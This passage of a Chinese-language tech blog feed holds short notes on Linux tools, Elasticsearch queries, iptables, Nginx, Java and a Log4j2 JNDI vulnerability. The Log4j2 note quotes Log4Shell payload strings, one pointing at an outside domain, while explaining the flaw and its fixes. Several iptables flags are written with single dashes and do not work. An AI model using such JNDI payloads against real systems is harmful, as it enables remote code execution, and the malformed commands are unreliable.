<p>這篇介紹Linux TCP&#x2F;IP Connections Limit。</p>
<h3 id="Kernel-Level-File-Descriptors-Limits"><a href="#Kernel-Level-File-Descriptors-Limits" class="headerlink" title="Kernel-Level File Descriptors Limits"></a>Kernel-Level File Descriptors Limits</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> /proc/sys/fs/file-max</span><br><span class="line"></span><br><span class="line">[root@localhost]<span class="comment"># cat /proc/sys/fs/file-max</span></span><br><span class="line">2018373</span><br><span class="line"></span><br><span class="line">查目前使用量:</span><br><span class="line">$ <span class="built_in">cat</span> /proc/sys/fs/file-nr</span><br><span class="line">[root@localhost]<span class="comment"># cat /proc/sys/fs/file-nr</span></span><br><span class="line">7360    0       2018373</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>TCP</tag>
      </tags>
  </entry>
  <entry>
    <title>Intro Linux $ vmstat</title>
    <url>/posts/b4b10b33/</url>
    <content><![CDATA[<h3 id="Intro-Linux-vmstat"><a href="#Intro-Linux-vmstat" class="headerlink" title="Intro Linux $ vmstat"></a>Intro Linux $ vmstat</h3><span id="more"></span>
<p>這篇介紹Linux $ vmstat指令。</p>
<h3 id="用途"><a href="#用途" class="headerlink" title="用途"></a>用途</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">查看CPU usage、memory usage、IO <span class="built_in">read</span>/write。</span><br><span class="line"></span><br><span class="line">在Linux輸入</span><br><span class="line">$ vmstat</span><br><span class="line"></span><br><span class="line">Output:</span><br><span class="line">procs -----------memory---------- ---swap-- -----io---- -system-- ------cpu-----</span><br><span class="line"> r  b   swpd   free   buff  cache   si   so    bi    bo   <span class="keyword">in</span>   cs us sy <span class="built_in">id</span> wa st</span><br><span class="line"> 0  0      0 11560580     12 266248    0    0     4     3   95  161  1  0 99  0  0</span><br></pre></td></tr></table></figure>

<h3 id="參數說明"><a href="#參數說明" class="headerlink" title="參數說明"></a>參數說明</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">proc:</span><br><span class="line">r: Queue中的process個數</span><br><span class="line">b: 等待中的process個數</span><br><span class="line"></span><br><span class="line">memory:</span><br><span class="line">swpd: 虛擬記憶體所占用的空間</span><br><span class="line">free: 可用的記憶體空間</span><br><span class="line">buff: Buffer所占用的記憶體空間</span><br><span class="line">cache: Cache所占用的記憶體空間</span><br><span class="line"></span><br><span class="line">swap:</span><br><span class="line">si: Swap-<span class="keyword">in</span> (從disk寫入記憶體的大小)</span><br><span class="line">so: Swap-out (從記憶體寫到disk的大小)</span><br><span class="line"></span><br><span class="line">io:</span><br><span class="line">bi: I/O 每秒讀取的block個數</span><br><span class="line">bo: I/O 每秒寫入的block個數</span><br><span class="line"></span><br><span class="line">system:</span><br><span class="line"><span class="keyword">in</span>: 每秒中斷的個數</span><br><span class="line">cs: 每秒context switch的個數。</span><br><span class="line">Context switch意指process在多工的環境或是遇到中斷的情形下進行狀態切換的動作。</span><br><span class="line"></span><br><span class="line">cpu</span><br><span class="line">us: 使用者執行的時間 (user time)</span><br><span class="line">sy: Kernel執行的時間 (system time)</span><br><span class="line"><span class="built_in">id</span>: Idle等待的時間</span><br><span class="line">wa: 等待I/O的時間</span><br><span class="line">st: 多工環境中，時間竊取(time stolen)的時間。</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Intro Kibana Query Language For UpdateByQuery And DeleteByQuery</title>
    <url>/posts/1d579fb3/</url>
    <content><![CDATA[<h2 id="Intro-Kibana-Query-Language-For-UpdateByQuery-And-DeleteByQuery"><a href="#Intro-Kibana-Query-Language-For-UpdateByQuery-And-DeleteByQuery" class="headerlink" title="Intro Kibana Query Language For UpdateByQuery And DeleteByQuery"></a>Intro Kibana Query Language For UpdateByQuery And DeleteByQuery</h2><span id="more"></span>
<p>這篇介紹透過Kibana Query Language 做 UpdateByQuery Or DeleteByQuery Record。</p>
<h2 id="UpdateByQuery-Example"><a href="#UpdateByQuery-Example" class="headerlink" title="UpdateByQuery Example:"></a>UpdateByQuery Example:</h2><h2 id="POST-table-x2F-update-by-query-“track-total-hits”-true-“query”-“bool”-“filter”-“range”-“StartTime”-“from”-“2020-x2F-12-x2F-11-00-00-00-000”-“to”-“2020-x2F-12-x2F-11-23-59-00-000”-“include-upper”-true-“include-lower”-true-“format”-“yyyy-x2F-MM-x2F-dd-HH-mm-ss-SSS”-“should”-“term”-“status”-“value”-1-“minimum-should-match”-1-“script”-“source”-“ctx-source-status-x3D-2”-“lang”-“painless”"><a href="#POST-table-x2F-update-by-query-“track-total-hits”-true-“query”-“bool”-“filter”-“range”-“StartTime”-“from”-“2020-x2F-12-x2F-11-00-00-00-000”-“to”-“2020-x2F-12-x2F-11-23-59-00-000”-“include-upper”-true-“include-lower”-true-“format”-“yyyy-x2F-MM-x2F-dd-HH-mm-ss-SSS”-“should”-“term”-“status”-“value”-1-“minimum-should-match”-1-“script”-“source”-“ctx-source-status-x3D-2”-“lang”-“painless”" class="headerlink" title="POST table*&#x2F;_update_by_query{  “track_total_hits”:true,  “query”: {    “bool”: {      “filter”: [        {          “range”: {            “StartTime”: {              “from”: “2020&#x2F;12&#x2F;11 00:00:00.000”,              “to”: “2020&#x2F;12&#x2F;11 23:59:00.000”,              “include_upper”: true,              “include_lower”: true,              “format”: “yyyy&#x2F;MM&#x2F;dd HH:mm:ss.SSS”            }          }        }      ],      “should”: [        {          “term”: {            “status”: {              “value”: 1            }          }        }      ],      “minimum_should_match”: 1    }  },  “script”: {    “source”: “ctx._source.status&#x3D;2”,    “lang”: “painless”  }}"></a>POST table*&#x2F;_update_by_query<br>{<br>  “track_total_hits”:true,<br>  “query”: {<br>    “bool”: {<br>      “filter”: [<br>        {<br>          “range”: {<br>            “StartTime”: {<br>              “from”: “2020&#x2F;12&#x2F;11 00:00:00.000”,<br>              “to”: “2020&#x2F;12&#x2F;11 23:59:00.000”,<br>              “include_upper”: true,<br>              “include_lower”: true,<br>              “format”: “yyyy&#x2F;MM&#x2F;dd HH:mm:ss.SSS”<br>            }<br>          }<br>        }<br>      ],<br>      “should”: [<br>        {<br>          “term”: {<br>            “status”: {<br>              “value”: 1<br>            }<br>          }<br>        }<br>      ],<br>      “minimum_should_match”: 1<br>    }<br>  },<br>  “script”: {<br>    “source”: “ctx._source.status&#x3D;2”,<br>    “lang”: “painless”<br>  }<br>}</h2><p>memo:<br>將StartTime符合2020&#x2F;12&#x2F;11 00:00:00.000 ~ 2020&#x2F;12&#x2F;11 23:59:00.000時間區間內 且 status &#x3D; 1的資料<br>改成status &#x3D; 2</p>
<h2 id="DeleteByQuery-Example"><a href="#DeleteByQuery-Example" class="headerlink" title="DeleteByQuery Example:"></a>DeleteByQuery Example:</h2><p>POST table*&#x2F;_delete_by_query?scroll_size&#x3D;5000<br>{<br>  “query”: {<br>    “term”: {<br>      “key”: “value”<br>    }<br>  }<br>}</p>
]]></content>
      <categories>
        <category>ElasticSearch</category>
      </categories>
      <tags>
        <tag>ElasticSearch</tag>
        <tag>KibanaQueryLanguage</tag>
      </tags>
  </entry>
  <entry>
    <title>Intro JsonView</title>
    <url>/posts/2ca890e3/</url>
    <content><![CDATA[<h2 id="Intro-JsonView-amp-How-to-use"><a href="#Intro-JsonView-amp-How-to-use" class="headerlink" title="Intro JsonView &amp; How to use"></a>Intro JsonView &amp; How to use</h2><span id="more"></span>
<p>這篇簡介JsonView &amp; How to use，因為資料或功能模組定義，<br>針對同樣的項目(table&#x2F;item)允許或需要操作的欄位(column&#x2F;attribute)有所不同。<br>可以用JsonView來定義需要產出的欄位。</p>
<h2 id="Example"><a href="#Example" class="headerlink" title="Example:"></a>Example:</h2><p>public class TestJsonView {</p>
<p>public interface TestView {<br>}</p>
<p>private String userName;</p>
<p>private String passWord;</p>
<p>@JsonView({TestView.class})<br>public String getUserName() {<br>    return userName;<br>}	</p>
<p>public String getPassWord() {<br>    return passWord;<br>}</p>
<p>}</p>
<p>String jsonString &#x3D; JSONUtils.toJsonString(TestJsonViewObj, TestJsonView.TestView.class);</p>
<p>Output: {“userName” : “xxx”}</p>
<p>只列出userName，不會列出passWord</p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Json</tag>
      </tags>
  </entry>
  <entry>
    <title>Intro Linux iptables</title>
    <url>/posts/ad5ceb27/</url>
    <content><![CDATA[<h3 id="Intro-Linux-iptables"><a href="#Intro-Linux-iptables" class="headerlink" title="Intro Linux iptables"></a>Intro Linux iptables</h3><span id="more"></span>
<p>iptables是Linux上常用的防火牆軟件，iptables用來過濾網路封包，<br>正確的設定 iptables 規則可以有效提升 Linux 網路安全，網管人員設定開放哪些 IP 與哪些 Port，來阻擋駭客攻擊。</p>
<p>iptables 的設計結構可以分三層， Table -&gt; Chains -&gt; Rules ， iptables 中可以包含多個 Table ，而一個 Table 又可以包含多個 Chain ，一個 Chain 也可以包含多個 Rule 。</p>
<p>Table ：防火牆規則群組。<br>Chain：防火牆規則鏈。<br>Rule：防火牆規則。</p>
<h3 id="Chains-amp-Tables"><a href="#Chains-amp-Tables" class="headerlink" title="Chains &amp; Tables"></a>Chains &amp; Tables</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">iptables 內建有五個 Tables，分別是 Filter Table, NAT Table, Mangle Table, Raw Table, Security Table。</span><br></pre></td></tr></table></figure>

<h3 id="Filter-Table"><a href="#Filter-Table" class="headerlink" title="Filter Table"></a>Filter Table</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Filter Table 是 iptables 中預設的 table，如果你沒有新增自訂的 Table ，那麼 iptable 會使用 Filter Table 裡的設定來處理網路封包。</span><br><span class="line"></span><br><span class="line">Filter Table 預設有三個 Chain : INPUT, OUTPUT, FORWARD， 分別用來處理三種不同的網路封包。</span><br><span class="line"></span><br><span class="line">INPUT chain：處理由外部機器傳過來的封包。</span><br><span class="line">OUTPUT Chain：處理本機傳出去給別台機器的封包。</span><br><span class="line">FORWARD Chain：處理外部機器透過本機，要傳給第三方機器的封包，如果你的機器是一台 Router or Proxy，才會存在這種封包。</span><br></pre></td></tr></table></figure>

<h3 id="NAT-Table-Network-Address-Translation"><a href="#NAT-Table-Network-Address-Translation" class="headerlink" title="NAT Table : Network Address Translation"></a>NAT Table : Network Address Translation</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">NAT Table 預設有二個 Chain ： PREROUTING, POSTROUTING 。</span><br><span class="line"></span><br><span class="line">PREROUTING chain : 再 Routing 之前轉換封包來源 IP 資訊，例如。</span><br><span class="line">POSTROUTING chain : 再 Routing 之後轉換封包本機 IP 資訊，例如本機 IP 會寫成 127.0.0.1 ，但是傳送出去後，會轉換回對外開放的 IP 如 10.99.82.1。</span><br></pre></td></tr></table></figure>

<h3 id="Rule-amp-Target"><a href="#Rule-amp-Target" class="headerlink" title="Rule &amp; Target"></a>Rule &amp; Target</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">iptables 預設有三種 Target ，分別是 ACCEPT, REJECT, LOG 。</span><br><span class="line"></span><br><span class="line">ACCEPT：接受這個封包</span><br><span class="line">REJECT：拒絕這個封包</span><br><span class="line">LOG： 記錄下這個封包， Log 寫入檔案 /var/log/message</span><br></pre></td></tr></table></figure>

<h3 id="如何使用-iptables"><a href="#如何使用-iptables" class="headerlink" title="如何使用 iptables"></a>如何使用 iptables</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">使用 iptables 前，前先確定你的系統有安裝以下兩個套件。</span><br><span class="line"></span><br><span class="line">iptables</span><br><span class="line">iptables-services</span><br><span class="line"></span><br><span class="line">CentOS 安裝方式如下：</span><br><span class="line"></span><br><span class="line">sudo yum install iptables-services iptables</span><br></pre></td></tr></table></figure>

<h3 id="清除已有iptables規則"><a href="#清除已有iptables規則" class="headerlink" title="清除已有iptables規則"></a>清除已有iptables規則</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">使用 -F 參數可以清除 iptables 所有的 rule 。</span><br><span class="line"></span><br><span class="line">sudo iptables -F</span><br></pre></td></tr></table></figure>

<h3 id="開放指定的端口"><a href="#開放指定的端口" class="headerlink" title="開放指定的端口"></a>開放指定的端口</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 允許本機訪問本機</span></span><br><span class="line">iptables -A INPUT -s 127.0.0.1 -d 127.0.0.1 -j ACCEPT</span><br><span class="line"><span class="comment"># 允許已建立的或相關連的通行</span></span><br><span class="line">iptables -A INPUT -m state -state ESTABLISHED,RELATED -j ACCEPT</span><br><span class="line"><span class="comment"># 允許所有本機向外的訪問</span></span><br><span class="line">iptables -A OUTPUT -j ACCEPT</span><br><span class="line"><span class="comment"># 允許訪問22 port</span></span><br><span class="line">iptables -A INPUT -p tcp -dport 22 -j ACCEPT</span><br><span class="line"><span class="comment"># 允許訪問80 port</span></span><br><span class="line">iptables -A INPUT -p tcp -dport 80 -j ACCEPT</span><br><span class="line"><span class="comment"># 允許FTP服務的21和20 port</span></span><br><span class="line">iptables -A INPUT -p tcp -dport 21 -j ACCEPT</span><br><span class="line">iptables -A INPUT -p tcp -dport 20 -j ACCEPT</span><br><span class="line">1）.用DROP方法</span><br><span class="line"></span><br><span class="line">iptables -A INPUT -p tcp -j DROP</span><br><span class="line">2）.用REJECT方法</span><br><span class="line"></span><br><span class="line">iptables -A INPUT -j REJECT</span><br><span class="line">iptables -A FORWARD -j REJECT</span><br></pre></td></tr></table></figure>

<h3 id="過濾IP"><a href="#過濾IP" class="headerlink" title="過濾IP"></a>過濾IP</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#擋掉某個IP的命令是</span></span><br><span class="line">iptables -I INPUT -s 123.45.6.7 -j DROP</span><br><span class="line"><span class="comment">#封鎖某個網段即從123.0.0.1到123.255.255.254的命令</span></span><br><span class="line">iptables -I INPUT -s 123.0.0.0/8 -j DROP</span><br><span class="line"><span class="comment">#封鎖一個class B 的IP網段即從123.45.0.1到123.45.255.254的命令</span></span><br><span class="line">iptables -I INPUT -s 124.45.0.0/16 -j DROP</span><br><span class="line"><span class="comment">#封鎖一個class C 的IP網段即從123.45.6.1到123.45.6.254的命令是</span></span><br><span class="line">iptables -I INPUT -s 123.45.6.0/24 -j DROP</span><br></pre></td></tr></table></figure>

<h3 id="查看已建立的iptables規則"><a href="#查看已建立的iptables規則" class="headerlink" title="查看已建立的iptables規則"></a>查看已建立的iptables規則</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">iptables -L -n</span><br><span class="line">v：顯示詳細信息，包括每條規則的匹配包數量和匹配字節數</span><br><span class="line">x：在 v 的基礎上，禁止自動單位換算（K、M） vps偵探</span><br><span class="line">n：只顯示IP地址和端口號，不將ip解析為域名</span><br></pre></td></tr></table></figure>

<h3 id="刪除已添加的iptables規則"><a href="#刪除已添加的iptables規則" class="headerlink" title="刪除已添加的iptables規則"></a>刪除已添加的iptables規則</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">將所有iptables以序號標記顯示，執行：</span><br><span class="line">iptables -L -n -line-numbers</span><br><span class="line">上面指令在 centOS 上測試結果：</span><br><span class="line"></span><br><span class="line">Bad argument `-line-numbers<span class="string">&#x27;</span></span><br><span class="line"><span class="string">Try `iptables -h&#x27;</span> or <span class="string">&#x27;iptables --help&#x27;</span> <span class="keyword">for</span> more information.</span><br><span class="line">刪除INPUT裡序號為8的規則，執行：</span><br><span class="line"></span><br><span class="line">iptables -D INPUT 8</span><br></pre></td></tr></table></figure>

<h3 id="iptables的開機啟動及規則保存"><a href="#iptables的開機啟動及規則保存" class="headerlink" title="iptables的開機啟動及規則保存"></a>iptables的開機啟動及規則保存</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">CentOS上可能會存在安裝好iptables後，iptables並不開機自啟動，可以執行一下：</span><br><span class="line"></span><br><span class="line">chkconfig -level 345 iptables on</span><br><span class="line">將其加入開機啟動。</span><br><span class="line"></span><br><span class="line">CentOS上可以執行下列指令來儲存規則：</span><br><span class="line"></span><br><span class="line">service iptables save</span><br><span class="line">Debian/Ubuntu上iptables是不會保存規則的，請使用 iptables-save 指令可以儲存所有的 chain &amp; rule 。</span><br><span class="line"></span><br><span class="line">sudo iptables-save &gt; /etc/iptables.rules</span><br><span class="line">為了重啟服務器後,規則自動載入,我們建立以下文件:</span><br><span class="line"></span><br><span class="line">sudo vim /etc/network/if-pre-up.d/iptables<span class="comment">#!/bin/bash</span></span><br><span class="line">iptables-save &gt; /etc/iptables.rules</span><br><span class="line">設定執行權限：</span><br><span class="line"></span><br><span class="line"><span class="built_in">chmod</span> +x /etc/network/if-pre-up.d/iptables</span><br><span class="line"></span><br><span class="line">在 CentOS:</span><br><span class="line">The /etc/sysconfig/iptables-config file stores information used by the kernel to <span class="built_in">set</span> up packet filtering services at boot time or whenever the service is started.</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>iptables</tag>
      </tags>
  </entry>
  <entry>
    <title>Intro Local Variable Out Defined In An Enclosing Scope Must Be Final Or Effectively Final</title>
    <url>/posts/e1c7745b/</url>
    <content><![CDATA[<h3 id="Intro-Local-Variable-Out-Defined-In-An-Enclosing-Scope-Must-Be-Final-Or-Effectively-Final"><a href="#Intro-Local-Variable-Out-Defined-In-An-Enclosing-Scope-Must-Be-Final-Or-Effectively-Final" class="headerlink" title="Intro Local Variable Out Defined In An Enclosing Scope Must Be Final Or Effectively Final"></a>Intro Local Variable Out Defined In An Enclosing Scope Must Be Final Or Effectively Final</h3><span id="more"></span>
<p>這篇介紹Local Variable Out Defined In An Enclosing Scope Must Be Final Or Effectively Final。</p>
<h3 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">在stream().forEach()方法內使用一個外部的參數時，會出現以下</span><br><span class="line">Local variable out defined <span class="keyword">in</span> an enclosing scope must be final or effectively final 錯誤訊息。</span><br><span class="line"></span><br><span class="line">list.stream().forEach(x -&gt; &#123;</span><br><span class="line">	try &#123;</span><br><span class="line">		gen(out);</span><br><span class="line">	&#125; catch (Exception e) &#123;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">在gen(out); 這行會出現以上錯誤訊息。</span><br><span class="line"></span><br><span class="line">解決方法為</span><br><span class="line">final JspWriter out1  = out;</span><br><span class="line">list.stream().forEach(x -&gt; &#123;</span><br><span class="line">	try &#123;</span><br><span class="line">		gen(out1);</span><br><span class="line">	&#125; catch (Exception e) &#123;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Intro Log4j2 JNDI For CVE</title>
    <url>/posts/a69d8abe/</url>
    <content><![CDATA[<h3 id="Intro-Log4j2-JNDI-For-CVE"><a href="#Intro-Log4j2-JNDI-For-CVE" class="headerlink" title="Intro Log4j2 JNDI For CVE"></a>Intro Log4j2 JNDI For CVE</h3><span id="more"></span>
<p>這篇介紹Log4j2 JNDI For CVE。</p>
<h3 id="2021-x2F-12-x2F-10公告Log4j2漏洞"><a href="#2021-x2F-12-x2F-10公告Log4j2漏洞" class="headerlink" title="2021&#x2F;12&#x2F;10公告Log4j2漏洞"></a>2021&#x2F;12&#x2F;10公告Log4j2漏洞</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Log4j2的xml configuration均對應至相關的外掛物件。</span><br><span class="line">此次出現重大漏洞問題的是一個不太常用的class:JndiLookup。</span><br><span class="line"></span><br><span class="line">這個class雖然很少用到，但每次使用info , warn , error等<span class="built_in">log</span></span><br><span class="line">寫入時，皆會去檢查是否執行Lookup的邏輯。</span><br><span class="line"></span><br><span class="line">各大資安廠商在釋出漏洞驗證報告時的截圖均是以<span class="variable">$Jndi</span> </span><br><span class="line">開啟本地計算器為例，以此表示Jndi存在嚴重的安全隱患。</span><br><span class="line"></span><br><span class="line">發現 <span class="variable">$&#123;jndi:ldap://127.0.0.1:1389/badClassName&#125;</span> 這段程式碼</span><br><span class="line">會開啟了本機的計算機，驗證此漏洞。</span><br></pre></td></tr></table></figure>

<h3 id="JNDI三個概念"><a href="#JNDI三個概念" class="headerlink" title="JNDI三個概念"></a>JNDI三個概念</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">1、JNDI全名 Java Naming and Directory Interface，是用於目錄</span><br><span class="line">服務的Java API，它允許Java客戶端通過名稱發現查詢資料和資源(以</span><br><span class="line">Java物件的形式)。</span><br><span class="line"></span><br><span class="line">2、觸發Lookup外掛的場景是使用：<span class="variable">$&#123;&#125;</span>，如上述的<span class="variable">$&#123;java:version&#125;</span>，</span><br><span class="line">表示使用JavaLookup外掛，傳入值為version然後返回對應的結果，而</span><br><span class="line">此處的<span class="variable">$&#123;jndi:ldap://ip:port&#125;</span> 則同理表示呼叫JndiLookup傳入值</span><br><span class="line">為 ldap://ip:port。</span><br><span class="line"></span><br><span class="line">3、jndi是目錄介面，所以JndiLookup中則是各種目錄介面的實現集合，</span><br><span class="line">可發現JndiLookup中可直接呼叫的具體實現類有很多，其中就包括</span><br><span class="line">LdapURLContext。</span><br></pre></td></tr></table></figure>

<h3 id="結論-amp-解決方法"><a href="#結論-amp-解決方法" class="headerlink" title="結論 &amp; 解決方法"></a>結論 &amp; 解決方法</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">首先jndi本身並不是Log4j2框架的產物，而是Jdk自身的功能，對應的包路徑為com.sun.jndi。</span><br><span class="line"></span><br><span class="line">而Log4j2框架中JndiLookup使用到了Jndi的功能，但是對應的傳參則較為隨意，</span><br><span class="line">這就是一個很大的問題，如通過http的方式給傳引數為：<span class="variable">$&#123;jndi:ldap://davidchenblog.com/service&#125;</span>，</span><br><span class="line">而服務又恰巧把該引數打到了日誌中，這就會導致很大的漏洞，因為誰也無法</span><br><span class="line">保證注入的davidchenblog.com/service返回的物件是什麼，相當於是一個很大</span><br><span class="line">的後門，注入者可以通過此漏洞任意執行所有程式碼。</span><br><span class="line"></span><br><span class="line">解決方法:</span><br><span class="line">1. 將Log4j2升級至2.16.0版本。</span><br><span class="line">2. 無法短時間升級時，在現有專案下增加log4j2.formatMsgNoLookups=<span class="literal">true</span>。</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Log4j2</category>
      </categories>
      <tags>
        <tag>Log4j2</tag>
        <tag>CVE</tag>
      </tags>
  </entry>
  <entry>
    <title>Intro Nginx Ip Hash</title>
    <url>/posts/25a864af/</url>
    <content><![CDATA[<h3 id="Intro-Nginx-Ip-Hash"><a href="#Intro-Nginx-Ip-Hash" class="headerlink" title="Intro Nginx Ip Hash"></a>Intro Nginx Ip Hash</h3><span id="more"></span>
<p>這篇介紹Nginx Ip Hash。</p>
<h3 id="ip-hash"><a href="#ip-hash" class="headerlink" title="ip_hash"></a>ip_hash</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Nginx ip_hash</span><br><span class="line"></span><br><span class="line">看以下<span class="built_in">source</span> code:</span><br><span class="line"><span class="keyword">for</span> (i = 0; i &lt; 3; i++) &#123;</span><br><span class="line">	<span class="built_in">hash</span> = (<span class="built_in">hash</span> * 113 + iphp-&gt;addr[i]) % 6271; //將IP用.的方式拆分成4段(ex: xxx.xxx.xxx.xxx)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">將1~3段加入<span class="built_in">hash</span>函數來保證相同的xxx.xxx.xxx.aaa會分配到同一台Server。</span><br><span class="line">正常來說相同的1~3段會是在同一區域或附近，使用相同的Backend Server是合理的。</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Nginx</category>
      </categories>
      <tags>
        <tag>Nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>Intro Maven Compiler Test</title>
    <url>/posts/40447940/</url>
    <content><![CDATA[<h3 id="Intro-Maven-Compiler-Test"><a href="#Intro-Maven-Compiler-Test" class="headerlink" title="Intro Maven Compiler Test"></a>Intro Maven Compiler Test</h3><span id="more"></span>
<p>這篇介紹在Maven Compiler Test設定。</p>
<h3 id="設定"><a href="#設定" class="headerlink" title="設定"></a>設定</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">clean package -Dmaven.test.skip=<span class="literal">false</span></span><br></pre></td></tr></table></figure>

<h3 id="產生JAR"><a href="#產生JAR" class="headerlink" title="產生JAR"></a>產生JAR</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">&lt;scope&gt;<span class="built_in">test</span>&lt;/scope&gt; -&gt; 在compiler不產生JAR</span><br><span class="line">移除這行就會產生JAR</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Maven</category>
      </categories>
      <tags>
        <tag>Maven</tag>
      </tags>
  </entry>
  <entry>
    <title>Intro NetworkManager</title>
    <url>/posts/c2206ec3/</url>
    <content><![CDATA[<h3 id="Intro-NetworkManager"><a href="#Intro-NetworkManager" class="headerlink" title="Intro NetworkManager"></a>Intro NetworkManager</h3><span id="more"></span>
<p>NetworkManager是一個自動化網路管理套件，用來管理網路卡。好處是自動化，<br>只要掃描到網路硬體，就會自動產生資料。這功能用在筆電、個人電腦可自動設定<br>網路卡，非常方便。但用在伺服器，不是很方便。</p>
<h3 id="NetworkManager優點"><a href="#NetworkManager優點" class="headerlink" title="NetworkManager優點"></a>NetworkManager優點</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">網路可隨插即用，NetworkManager是活動的，使用者只要接上網路(WiFi、行動網路)就會</span><br><span class="line">自動配置，方便使用者連接網路。</span><br></pre></td></tr></table></figure>

<h3 id="網路設定不保存-amp-網路設備相容性高"><a href="#網路設定不保存-amp-網路設備相容性高" class="headerlink" title="網路設定不保存 &amp; 網路設備相容性高"></a>網路設定不保存 &amp; 網路設備相容性高</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">插上網路設備後自動產生，拔除網路設備後自動消失。也可以手動設定為永久設定。</span><br><span class="line">可接受大多數網路設備(USB無線網卡、手機網路共用...等)</span><br></pre></td></tr></table></figure>

<h3 id="NetworkManager套件"><a href="#NetworkManager套件" class="headerlink" title="NetworkManager套件"></a>NetworkManager套件</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">主要由以下四個組成:</span><br><span class="line">NetworkManager-team =&gt; 群組網路裝置共享函式庫</span><br><span class="line">NetworkManager-libnm =&gt; NetworkManager API 函式庫</span><br><span class="line">NetworkManager =&gt; 主要設定檔及指令</span><br><span class="line">NetworkManager-tui =&gt; nmtui 介面套件</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>NetworkManager</category>
      </categories>
      <tags>
        <tag>NetworkManager</tag>
      </tags>
  </entry>
  <entry>
    <title>Intro Nginx Warn Conflicting Server Name On Ignored</title>
    <url>/posts/b4da31e1/</url>
    <content><![CDATA[<h2 id="Intro-Nginx-Warn-Conflicting-Server-Name-On-Ignored"><a href="#Intro-Nginx-Warn-Conflicting-Server-Name-On-Ignored" class="headerlink" title="Intro Nginx Warn Conflicting Server Name On Ignored"></a>Intro Nginx Warn Conflicting Server Name On Ignored</h2><span id="more"></span>
<p>這篇介紹Nginx Warn Conflicting Server Name On Ignored。</p>
<h2 id="發生情境"><a href="#發生情境" class="headerlink" title="發生情境:"></a>發生情境:</h2><p>[root@test]# nginx -t<br>nginx: [warn] conflicting server name “{domain}” on 0.0.0.0:80, ignored</p>
<p>原因<br>server_name重複，請檢查所有的.conf</p>
]]></content>
      <categories>
        <category>Nginx</category>
      </categories>
      <tags>
        <tag>Nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>Intro Nginx Location Rewrite Setting</title>
    <url>/posts/c1f9486b/</url>
    <content><![CDATA[<h2 id="Intro-Nginx-Location-Rewrite-Setting"><a href="#Intro-Nginx-Location-Rewrite-Setting" class="headerlink" title="Intro Nginx Location Rewrite Setting"></a>Intro Nginx Location Rewrite Setting</h2><span id="more"></span>
<p>這篇介紹Nginx Location Rewrite Setting.</p>
<h2 id="How-to-set-redirect"><a href="#How-to-set-redirect" class="headerlink" title="How to set redirect?"></a>How to set redirect?</h2><p>From <span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMS4xL2FhYS8xMjM=">http://192.168.1.1/aaa/123<i class="fa fa-external-link-alt"></i></span> To <span class="exturl" data-url="aHR0cDovLzE3Mi4xLjAuMS8xMjM=">http://172.1.0.1/123<i class="fa fa-external-link-alt"></i></span></p>
<p>Nginx Setting:<br>location &#x2F;aaa&#x2F;123&#x2F; {<br>    rewrite &#x2F;aaa&#x2F;(.*) &#x2F;$1 break;<br>    proxy_pass <span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMS4xLw==">http://192.168.1.1<i class="fa fa-external-link-alt"></i></span>;<br>    proxy_set_header Host $host;<br>    proxy_set_header X-Real-IP $remote_addr;<br>    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;<br>    proxy_set_header X-Forwarded-Proto $scheme;<br>}</p>
]]></content>
      <categories>
        <category>Nginx</category>
      </categories>
      <tags>
        <tag>Nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>Intro OKHttp</title>
    <url>/posts/f41f1f7b/</url>
    <content><![CDATA[<h3 id="Intro-OKHttp"><a href="#Intro-OKHttp" class="headerlink" title="Intro OKHttp"></a>Intro OKHttp</h3><span id="more"></span>
<p>這篇簡介OKHttp。</p>
